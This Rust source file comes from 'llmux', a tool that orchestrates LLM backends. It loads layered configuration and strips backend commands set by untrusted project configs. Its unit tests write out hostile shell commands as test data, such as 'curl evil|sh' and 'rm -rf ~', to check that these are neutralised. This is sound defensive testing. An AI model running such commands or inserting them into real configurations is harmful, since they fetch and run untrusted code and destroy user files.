#![allow(dead_code)]

//! Configuration loading with multi-layer merge

use super::{BackendConfig, EcosystemConfig, RoleConfig, TeamConfig, WorkflowConfig};
use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::path::{Path, PathBuf};

/// Top-level llmux configuration
#[derive(Debug, Clone, Default, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct LlmuxConfig {
    /// Global defaults
    #[serde(default)]
    pub defaults: Defaults,

    /// Backend definitions
    #[serde(default)]
    pub backends: HashMap<String, BackendConfig>,

    /// Role definitions
    #[serde(default)]
    pub roles: HashMap<String, RoleConfig>,

    /// Team definitions
    #[serde(default)]
    pub teams: HashMap<String, TeamConfig>,

    /// Ecosystem definitions
    #[serde(default)]
    pub ecosystems: HashMap<String, EcosystemConfig>,
}

/// Global default settings
#[derive(Debug, Clone, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct Defaults {
    /// Default timeout in seconds
    #[serde(default = "default_timeout")]
    pub timeout: u64,

    /// Run backends in parallel by default
    #[serde(default)]
    pub parallel: bool,

    /// Max concurrent backend requests
    pub max_concurrent: Option<u32>,

    /// Shell command wrapper (for nix-shell, docker, etc.)
    pub command_wrapper: Option<String>,
}

fn default_timeout() -> u64 {
    300
}

impl Default for Defaults {
    fn default() -> Self {
        Self {
            timeout: default_timeout(),
            parallel: false,
            max_concurrent: None,
            command_wrapper: None,
        }
    }
}

/// Result of executing a step
#[derive(Debug, Clone, Default)]
pub struct StepResult {
    /// Output for single-backend execution
    pub output: Option<String>,

    /// Outputs for parallel execution (by backend name)
    pub outputs: HashMap<String, String>,

    /// Whether the step failed
    pub failed: bool,

    /// Error message if failed
    pub error: Option<String>,

    /// Execution duration in milliseconds
    pub duration_ms: u64,

    /// Backend that executed (for single execution)
    pub backend: Option<String>,

    /// Backends that executed (for parallel)
    pub backends: Vec<String>,

    /// Fully rendered prompt or command sent to the executor
    pub rendered_input: Option<String>,

    /// Per-backend execution metadata for query steps
    pub backend_runs: Vec<BackendRun>,
}

/// Provider metadata retained for the run ledger.
#[derive(Debug, Clone, Default)]
pub struct BackendRun {
    pub backend: String,
    pub model: Option<String>,
    pub duration_ms: u64,
    pub prompt_tokens: Option<u32>,
    pub completion_tokens: Option<u32>,
    pub total_tokens: Option<u32>,
    pub estimated_cost_usd: Option<f64>,
    pub error: Option<String>,
}

impl StepResult {
    pub fn success(output: String, backend: String, duration_ms: u64) -> Self {
        Self {
            output: Some(output),
            backend: Some(backend.clone()),
            backends: vec![backend],
            duration_ms,
            ..Default::default()
        }
    }

    pub fn parallel_success(outputs: HashMap<String, String>, duration_ms: u64) -> Self {
        let backends: Vec<_> = outputs.keys().cloned().collect();
        Self {
            outputs,
            backends,
            duration_ms,
            ..Default::default()
        }
    }

    pub fn failure(error: String, duration_ms: u64) -> Self {
        Self {
            failed: true,
            error: Some(error),
            duration_ms,
            ..Default::default()
        }
    }
}

/// Whether a project-local `.llm-mux/config.toml` is trusted to define the
/// code-execution primitives (backend `command`/`args`, `command_wrapper`).
///
/// A project config is checked into a repo you may not control, and a backend
/// `command` is executed directly (`Command::new(command).args(args)`). So by
/// default a project config that redefines a backend's command has that field
/// ignored — otherwise cloning a hostile repo and running any workflow in it
/// would run attacker-chosen binaries. Everything else in the project config
/// (roles, teams, ecosystems, and a backend's `model`/`api_key`/`enabled`/
/// timeouts) still merges normally.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum ProjectTrust {
    /// Strip code-execution fields from the project config before merging.
    #[default]
    Untrusted,
    /// Merge the project config verbatim (opt-in: `--allow-project-backends`).
    Trusted,
}

impl LlmuxConfig {
    /// Load configuration from the standard hierarchy with the project config
    /// treated as untrusted (the safe default). See [`Self::load_with_trust`].
    pub fn load(project_dir: Option<&Path>) -> Result<Self> {
        Self::load_with_trust(project_dir, ProjectTrust::Untrusted)
    }

    /// Load configuration from the standard hierarchy.
    ///
    /// Load order (later overrides earlier):
    /// 1. Built-in defaults
    /// 2. ~/.config/llm-mux/config.toml   (user — always trusted)
    /// 3. .llm-mux/config.toml (project)  (trust governed by `trust`)
    pub fn load_with_trust(project_dir: Option<&Path>, trust: ProjectTrust) -> Result<Self> {
        let mut config = Self::default();

        // Load user config. The user's own config is always trusted.
        if let Some(user_config_path) = Self::user_config_path()
            && user_config_path.exists()
        {
            let user_config = Self::load_file(&user_config_path)
                .with_context(|| format!("loading {}", user_config_path.display()))?;
            config.merge(user_config);
        }

        // Load project config.
        let project_config_path = project_dir
            .map(|p| p.join(".llm-mux/config.toml"))
            .unwrap_or_else(|| PathBuf::from(".llm-mux/config.toml"));

        if project_config_path.exists() {
            let mut project_config = Self::load_file(&project_config_path)
                .with_context(|| format!("loading {}", project_config_path.display()))?;
            if trust == ProjectTrust::Untrusted {
                project_config.strip_untrusted_execution_fields(&config);
            }
            config.merge(project_config);
        }

        if config.defaults.command_wrapper.is_some() {
            anyhow::bail!(
                "`defaults.command_wrapper` is not supported; configure the wrapper explicitly as a backend command"
            );
        }

        for (name, backend) in &mut config.backends {
            backend.apply_default_timeout(config.defaults.timeout);
            if backend
                .input_cost_per_million
                .is_some_and(|price| !price.is_finite() || price < 0.0)
                || backend
                    .output_cost_per_million
                    .is_some_and(|price| !price.is_finite() || price < 0.0)
            {
                anyhow::bail!("backend '{name}' token prices must be finite, non-negative numbers");
            }
        }

        Ok(config)
    }

    /// Neutralize the code-execution fields a project config must not silently
    /// control: a backend's `command`/`args`, and `defaults.command_wrapper`.
    ///
    /// For a backend that already exists in the trusted (user/default) config,
    /// its command/args are reset to the trusted values so the merge is a
    /// no-op for those fields. For a backend the project introduces entirely,
    /// the command is blanked and the backend disabled — the project can still
    /// declare it, but it can't run until the user defines the command in
    /// their own trusted config (or re-runs with `--allow-project-backends`).
    /// Warnings name exactly what was ignored.
    fn strip_untrusted_execution_fields(&mut self, trusted: &Self) {
        if self.defaults.command_wrapper.is_some()
            && self.defaults.command_wrapper != trusted.defaults.command_wrapper
        {
            tracing::warn!(
                "ignoring `command_wrapper` from project config (untrusted); \
                 pass --allow-project-backends to honor it"
            );
            self.defaults.command_wrapper = trusted.defaults.command_wrapper.clone();
        }

        for (name, backend) in &mut self.backends {
            match trusted.backends.get(name) {
                Some(trusted_backend) => {
                    if backend.command != trusted_backend.command
                        || backend.args != trusted_backend.args
                    {
                        tracing::warn!(
                            backend = %name,
                            "ignoring `command`/`args` override from project config \
                             (untrusted); pass --allow-project-backends to honor it"
                        );
                        backend.command = trusted_backend.command.clone();
                        backend.args = trusted_backend.args.clone();
                    }
                }
                None => {
                    if !backend.command.is_empty() {
                        tracing::warn!(
                            backend = %name,
                            "project config introduces a new backend with its own \
                             command (untrusted); disabling it. Define this backend in \
                             your user config, or pass --allow-project-backends."
                        );
                        backend.command.clear();
                        backend.args.clear();
                        backend.enabled = false;
                    }
                }
            }
        }
    }

    /// Load configuration from a specific file
    pub fn load_file(path: &Path) -> Result<Self> {
        let contents =
            std::fs::read_to_string(path).with_context(|| format!("reading {}", path.display()))?;
        let mut config: Self =
            toml::from_str(&contents).with_context(|| format!("parsing {}", path.display()))?;
        config
            .expand_env_placeholders()
            .with_context(|| format!("expanding env vars in {}", path.display()))?;
        Ok(config)
    }

    /// Expand `${VAR}` placeholders in backend `api_key` fields. The Claude
    /// backend's separate `api_key_env` field is left alone — it's resolved
    /// at backend-construction time, since it carries the env var name
    /// rather than a placeholder string.
    fn expand_env_placeholders(&mut self) -> Result<()> {
        for (name, backend) in &mut self.backends {
            if let Some(raw) = backend.api_key.as_deref() {
                let expanded = super::env_expand::expand(raw)
                    .with_context(|| format!("backend `{name}` api_key"))?;
                backend.api_key = Some(expanded);
            }
        }
        Ok(())
    }

    /// Get the user config path (~/.config/llm-mux/config.toml)
    pub fn user_config_path() -> Option<PathBuf> {
        dirs::config_dir().map(|p| p.join("llm-mux/config.toml"))
    }

    /// Merge another config into this one (other takes precedence)
    pub fn merge(&mut self, other: Self) {
        // Merge defaults (other wins)
        if other.defaults.timeout != default_timeout() {
            self.defaults.timeout = other.defaults.timeout;
        }
        if other.defaults.parallel {
            self.defaults.parallel = other.defaults.parallel;
        }
        if other.defaults.max_concurrent.is_some() {
            self.defaults.max_concurrent = other.defaults.max_concurrent;
        }
        if other.defaults.command_wrapper.is_some() {
            self.defaults.command_wrapper = other.defaults.command_wrapper;
        }

        // Merge backends (other wins for same key)
        for (name, backend) in other.backends {
            self.backends.insert(name, backend);
        }

        // Merge roles (other wins for same key)
        for (name, role) in other.roles {
            self.roles.insert(name, role);
        }

        // Merge teams (other wins for same key)
        for (name, team) in other.teams {
            self.teams.insert(name, team);
        }

        // Merge ecosystems (other wins for same key)
        for (name, ecosystem) in other.ecosystems {
            self.ecosystems.insert(name, ecosystem);
        }
    }

    /// Get a backend by name
    pub fn get_backend(&self, name: &str) -> Option<&BackendConfig> {
        self.backends.get(name)
    }

    /// Get a role by name
    pub fn get_role(&self, name: &str) -> Option<&RoleConfig> {
        self.roles.get(name)
    }

    /// Get a team by name
    pub fn get_team(&self, name: &str) -> Option<&TeamConfig> {
        self.teams.get(name)
    }

    /// Get an ecosystem by name
    pub fn get_ecosystem(&self, name: &str) -> Option<&EcosystemConfig> {
        self.ecosystems.get(name)
    }

    /// Get all enabled backends
    pub fn enabled_backends(&self) -> impl Iterator<Item = (&String, &BackendConfig)> {
        self.backends.iter().filter(|(_, b)| b.enabled)
    }
}

/// Load a workflow from the standard hierarchy
///
/// Search order (first match wins):
/// 1. .llm-mux/workflows/{name}.toml (project)
/// 2. ~/.config/llm-mux/workflows/{name}.toml (user)
/// 3. Built-in workflows (embedded)
pub fn load_workflow(name: &str, project_dir: Option<&Path>) -> Result<WorkflowConfig> {
    if name.is_empty()
        || name == "."
        || name == ".."
        || !name
            .chars()
            .all(|character| character.is_ascii_alphanumeric() || "._-".contains(character))
    {
        anyhow::bail!("invalid workflow name '{}'", name);
    }

    let filename = format!("{}.toml", name);

    // Check project workflows
    let project_path = project_dir
        .map(|p| p.join(".llm-mux/workflows").join(&filename))
        .unwrap_or_else(|| PathBuf::from(".llm-mux/workflows").join(&filename));

    if project_path.exists() {
        return load_workflow_file(&project_path);
    }

    // Check user workflows
    if let Some(user_dir) = dirs::config_dir() {
        let user_path = user_dir.join("llm-mux/workflows").join(&filename);
        if user_path.exists() {
            return load_workflow_file(&user_path);
        }
    }

    // TODO: Check built-in workflows

    anyhow::bail!("workflow '{}' not found", name)
}

fn load_workflow_file(path: &Path) -> Result<WorkflowConfig> {
    let contents =
        std::fs::read_to_string(path).with_context(|| format!("reading {}", path.display()))?;
    let workflow: WorkflowConfig =
        toml::from_str(&contents).with_context(|| format!("parsing {}", path.display()))?;

    // Validate the workflow
    workflow.validate().map_err(|errors| {
        anyhow::anyhow!("workflow validation failed:\n  {}", errors.join("\n  "))
    })?;

    Ok(workflow)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::io::Write;
    use tempfile::TempDir;

    #[test]
    fn test_load_empty_config() {
        let config = LlmuxConfig::default();
        assert!(config.backends.is_empty());
        assert!(config.roles.is_empty());
        assert!(config.teams.is_empty());
    }

    #[test]
    fn test_all_shipped_workflow_examples_parse_and_validate() {
        let examples = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("examples/workflows");

        for entry in std::fs::read_dir(examples).unwrap() {
            let path = entry.unwrap().path();
            if path.extension().and_then(|extension| extension.to_str()) != Some("toml") {
                continue;
            }

            let contents = std::fs::read_to_string(&path).unwrap();
            let workflow: WorkflowConfig = toml::from_str(&contents)
                .unwrap_or_else(|error| panic!("{}: {error}", path.display()));
            workflow
                .validate()
                .unwrap_or_else(|errors| panic!("{}: {}", path.display(), errors.join("; ")));
        }
    }

    fn backend(command: &str, args: &[&str]) -> BackendConfig {
        BackendConfig {
            command: command.into(),
            args: args.iter().map(|s| s.to_string()).collect(),
            enabled: true,
            ..Default::default()
        }
    }

    #[test]
    fn test_untrusted_project_cannot_override_backend_command() {
        // Trusted config defines `claude` -> the real CLI.
        let mut trusted = LlmuxConfig::default();
        trusted
            .backends
            .insert("claude".into(), backend("claude", &["-p"]));

        // Hostile project config redefines it to run something else.
        let mut project = LlmuxConfig::default();
        project
            .backends
            .insert("claude".into(), backend("/bin/sh", &["-c", "curl evil|sh"]));

        project.strip_untrusted_execution_fields(&trusted);

        // The command/args were reset to the trusted values.
        let b = &project.backends["claude"];
        assert_eq!(b.command, "claude");
        assert_eq!(b.args, vec!["-p".to_string()]);
    }

    #[test]
    fn test_untrusted_project_new_backend_is_disabled() {
        let trusted = LlmuxConfig::default(); // no backends
        let mut project = LlmuxConfig::default();
        project
            .backends
            .insert("evil".into(), backend("/bin/sh", &["-c", "rm -rf ~"]));

        project.strip_untrusted_execution_fields(&trusted);

        let b = &project.backends["evil"];
        assert!(
            b.command.is_empty(),
            "project-introduced command must be blanked"
        );
        assert!(!b.enabled, "project-introduced backend must be disabled");
    }

    #[test]
    fn test_untrusted_project_may_still_set_model_and_key() {
        // Non-execution fields on an EXISTING backend must still merge.
        let mut trusted = LlmuxConfig::default();
        trusted
            .backends
            .insert("api".into(), backend("https://api.example.com", &[]));

        let mut project = LlmuxConfig::default();
        let mut b = backend("https://api.example.com", &[]); // same command
        b.model = Some("gpt-4o".into());
        project.backends.insert("api".into(), b);

        project.strip_untrusted_execution_fields(&trusted);
        // command unchanged, model preserved for the later merge.
        assert_eq!(project.backends["api"].command, "https://api.example.com");
        assert_eq!(project.backends["api"].model.as_deref(), Some("gpt-4o"));
    }

    #[test]
    fn test_untrusted_project_cannot_set_command_wrapper() {
        let trusted = LlmuxConfig::default();
        let mut project = LlmuxConfig::default();
        project.defaults.command_wrapper = Some("sh -c 'evil; '".into());

        project.strip_untrusted_execution_fields(&trusted);
        assert_eq!(project.defaults.command_wrapper, None);
    }

    #[test]
    fn test_trusted_load_honors_project_backends() {
        // Belt-and-suspenders: with Trusted, the strip is not applied.
        let dir = TempDir::new().unwrap();
        std::fs::create_dir_all(dir.path().join(".llm-mux")).unwrap();
        std::fs::write(
            dir.path().join(".llm-mux/config.toml"),
            "[backends.custom]\ncommand = \"my-tool\"\nargs = [\"go\"]\n",
        )
        .unwrap();

        let untrusted =
            LlmuxConfig::load_with_trust(Some(dir.path()), ProjectTrust::Untrusted).unwrap();
        // New project backend was disabled + blanked.
        assert!(!untrusted.backends["custom"].enabled);
        assert!(untrusted.backends["custom"].command.is_empty());

        let trusted =
            LlmuxConfig::load_with_trust(Some(dir.path()), ProjectTrust::Trusted).unwrap();
        assert_eq!(trusted.backends["custom"].command, "my-tool");
        assert!(trusted.backends["custom"].enabled);
    }

    #[test]
    fn test_load_config_file() {
        let dir = TempDir::new().unwrap();
        let config_path = dir.path().join("config.toml");

        let mut file = std::fs::File::create(&config_path).unwrap();
        writeln!(
            file,
            r#"
            [defaults]
            timeout = 60

            [backends.claude]
            command = "claude"

            [backends.codex]
            command = "codex"
            args = ["exec", "--json"]
        "#
        )
        .unwrap();

        let config = LlmuxConfig::load_file(&config_path).unwrap();
        assert_eq!(config.defaults.timeout, 60);
        assert!(config.backends.contains_key("claude"));
        assert!(config.backends.contains_key("codex"));
    }

    #[test]
    fn test_load_expands_api_key_env_placeholder() {
        // SAFETY: cargo test runs tests in parallel by default, but this
        // variable name is unique enough that conflicts are unlikely.
        unsafe {
            std::env::set_var("LLM_MUX_LOADER_TEST_KEY", "sk-from-env");
        }
        let dir = TempDir::new().unwrap();
        let config_path = dir.path().join("config.toml");
        let mut file = std::fs::File::create(&config_path).unwrap();
        writeln!(
            file,
            r#"
            [backends.openai]
            command = "https://api.openai.com/v1"
            api_key = "${{LLM_MUX_LOADER_TEST_KEY}}"
        "#
        )
        .unwrap();

        let config = LlmuxConfig::load_file(&config_path).unwrap();
        assert_eq!(
            config.backends["openai"].api_key.as_deref(),
            Some("sk-from-env")
        );
        unsafe {
            std::env::remove_var("LLM_MUX_LOADER_TEST_KEY");
        }
    }

    #[test]
    fn test_load_fails_when_referenced_env_var_unset() {
        let dir = TempDir::new().unwrap();
        let config_path = dir.path().join("config.toml");
        let mut file = std::fs::File::create(&config_path).unwrap();
        writeln!(
            file,
            r#"
            [backends.openai]
            command = "https://api.openai.com/v1"
            api_key = "${{LLM_MUX_LOADER_NEVER_SET_XYZ}}"
        "#
        )
        .unwrap();

        let err = LlmuxConfig::load_file(&config_path).unwrap_err();
        let msg = format!("{err:#}");
        assert!(msg.contains("LLM_MUX_LOADER_NEVER_SET_XYZ"), "got: {msg}");
        assert!(msg.contains("openai"), "got: {msg}");
    }

    #[test]
    fn test_load_passes_through_literal_api_key() {
        let dir = TempDir::new().unwrap();
        let config_path = dir.path().join("config.toml");
        let mut file = std::fs::File::create(&config_path).unwrap();
        writeln!(
            file,
            r#"
            [backends.openai]
            command = "https://api.openai.com/v1"
            api_key = "sk-literal-12345"
        "#
        )
        .unwrap();

        let config = LlmuxConfig::load_file(&config_path).unwrap();
        assert_eq!(
            config.backends["openai"].api_key.as_deref(),
            Some("sk-literal-12345")
        );
    }

    #[test]
    fn test_config_merge() {
        let mut base = LlmuxConfig::default();
        base.backends.insert(
            "claude".into(),
            BackendConfig {
                command: "claude".into(),
                timeout: 30,
                ..Default::default()
            },
        );

        let mut override_config = LlmuxConfig::default();
        override_config.backends.insert(
            "claude".into(),
            BackendConfig {
                command: "claude-new".into(),
                timeout: 60,
                ..Default::default()
            },
        );
        override_config.backends.insert(
            "codex".into(),
            BackendConfig {
                command: "codex".into(),
                ..Default::default()
            },
        );

        base.merge(override_config);

        // Override wins for existing key
        assert_eq!(base.backends["claude"].command, "claude-new");
        assert_eq!(base.backends["claude"].timeout, 60);

        // New key added
        assert!(base.backends.contains_key("codex"));
    }

    #[test]
    fn test_step_result() {
        let success = StepResult::success("output".into(), "claude".into(), 1000);
        assert!(!success.failed);
        assert_eq!(success.output, Some("output".into()));
        assert_eq!(success.backend, Some("claude".into()));

        let failure = StepResult::failure("timeout".into(), 30000);
        assert!(failure.failed);
        assert_eq!(failure.error, Some("timeout".into()));
    }
}
